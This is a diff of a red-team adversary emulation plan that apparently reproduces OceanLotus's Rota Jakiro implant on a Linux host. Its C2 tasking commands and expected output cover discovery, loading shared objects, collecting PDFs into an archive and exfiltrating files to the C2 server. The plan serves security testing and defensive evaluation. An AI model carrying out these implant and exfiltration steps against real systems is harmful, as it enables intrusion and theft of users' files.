@@ -566,17 +566,14 @@ OceanLotus downloads Rota Jakiro to the macOS host in the `/Users/hpotter/Librar
 ## Step 4 - Discovery on Linux Host
 ### 📖 Overview
 
-Step 4 emulates OceanLotus executing a shared object that conducts System information discovery using the `uname` syscall. 
+**Step 4 ** emulates OceanLotus executing conducting discovery on the Linux host. 
 
-The following information is collected. 
-- Host name 
-- Architecture
-- Kernel version 
+For initial collection, Rota Jakiro executes and collects the results from the `uname` syscall. Rota Jakiro sends the following information regarding the Linux host to the C2 server: Host name, Architecture, & Kernel version. Rota Jakiro then downloads and executes a shared object (mount.so file) performing discovery for mounted drives connected to the Linux host. The resulting information is saved to the `mount.txt` file. Rota Jakiro then uploads this file to the C2 server for offline analysis. 
 
 ---
 ### 👾 Red Team Procedures
 
-1. Use Rota Jakiro to collect the device information from the target. 
+1. Use Rota Jakiro to collect the device information from the target using the `uname` syscall. 
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_upload_dev_info"}'
    ```
@@ -590,7 +587,7 @@ The following information is collected.
    [SUCCESS] 2023/08/24 19:38:10 Successfully set task output.
    ```
 
-2. Upload shared object to execute `mount` command to discover drives on host.
+1. Download `mount.so` shared object to execute the `mount` command to discover drives on the Linux host.
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_upload_file", "payload": "mount.so"}'
    ```
@@ -600,22 +597,20 @@ The following information is collected.
    [INFO] 2023/08/24 13:30:10 Received task output for session:  01020304
    [Task] 2023/08/24 13:30:10 successfully wrote entire file.
    [SUCCESS] 2023/08/24 13:30:10 Successfully set task output.
-   [INFO] 2023/08/24 13:30:10 No tasks available for UUID:  01020304
    ```
 
-4. Verify the file upload successfully occurred.
+1. Verify the file upload successfully occurred.
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_query_file", "arg":"local_rota_file.so"}'
    ```
    Expected Output:
    ```
-   [INFO] 2023/08/24 13:26:12 Received beacon from existing implant 01020304.
    [INFO] 2023/08/24 13:26:12 Received task output for session:  01020304
-   [Task] 2023/08/24 13:26:12 Shared Object Executed!
+   [Task] 2023/08/24 13:26:12 file exists
    [SUCCESS] 2023/08/24 13:26:12 Successfully set task output.
    ```
 
-3. Execute the shared object
+1. Execute the shared object using the `update` command
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_run_plugin", "arg":"update"}'
    ```
@@ -627,7 +622,7 @@ The following information is collected.
    [SUCCESS] 2023/08/24 13:26:12 Successfully set task output.
    ```
 
-4. Exfil the `/tmp/mount.txt` file
+1. Exfil the `/tmp/mount.txt` file to the C2 server
    ```
    ./evalsC2client.py --set-task 01020304 '{"cmd":"Rota_steal_data", "arg": "/tmp/mount.txt"}'
    ```
@@ -637,11 +632,11 @@ The following information is collected.
    [SUCCESS] 2023/08/24 13:29:04 File uploaded: Successfully uploaded file to control server at './files/mount.txt'
    [INFO] 2023/08/24 13:29:04 No tasks available for UUID:  01020304
    ```
-5. View the retrieved file on the C2 server
-
-```
-cat ./files/mount.txt
-```
+1. View the retrieved file on the C2 server
+   
+   ```
+   cat ./files/mount.txt
+   ```
    
 
 ### 🔮 Reference Code & Reporting
@@ -665,16 +660,18 @@ cat ./files/mount.txt
 
 ## Step 5 - Collection
 ### 📖 Overview
-Rota Jakiro uses shared objects for code execution. NOTE: There is no public CTI reporting documenting exactly what these shared objects are executing. Therefore, the following code execution is based off general behaviors derived from CTI reporting targeting linux hosts.
+**Step five** emulates OceanLotus conducting collection of data using shared objects.
 
-Task the implant to upload the shared object (`local_payload_rota.so`) to the target host, the shared object copies and compresses files for collection. 
+OceanLotus downloads and executes a shared object on the Linux host (pdf.so). 
 
-The following commands are executed by the shared object: 
-- Create a hidden tmp.rota folder 
-- Starting from the $HOME folder, copy files with a .pdf extension into the tmp.rota folder
-- Compress all .pdf files contained in the tmp.rota folder and named `exilf.tar.gz`
+The shared object performs the following actions: 
+- creates the `tmp.rota` folder
+- Starting from the $HOME folder using the `find` command, copy files with a `.pdf` extension into the `tmp.rota` folder
+- All files are then compressed into a single file named `rota.tar.gz`. 
 
-Rota Jakiro confirms the target file were created
+Rota Jakiro confirms the target file was created.
+
+>Note: CTI reporting states Rota Jakiro uses shared objects for code execution. NOTE: There is no public CTI reporting documenting exactly what these shared objects are executing. Therefore, the following code execution is based off general behaviors derived from CTI reporting targeting linux hosts.
 
 ---
 ### 👾 Red Team Procedures
@@ -734,9 +731,8 @@ Rota Jakiro confirms the target file were created
 ## Step 6 - Exfil from Linux Host
 ### 📖 Overview
 
-The final step of the emulation plan is to exfiltrate the staged file in the `/tmp/` directory.
-Task the implant to upload the `/tmp/rota.tar.gz` file to the C2 server.
-
+**Step 6** emulates OceanLotus exfiltrating data of interest. 
+OceanLotus tasks Rota Jakiro to upload the `/tmp/rota.tar.gz` file to the C2 server completeing the objective. 
 *Note, the C2 server is limited to recieve data up to but not exceeding 65535 bytes.*
 
 ---
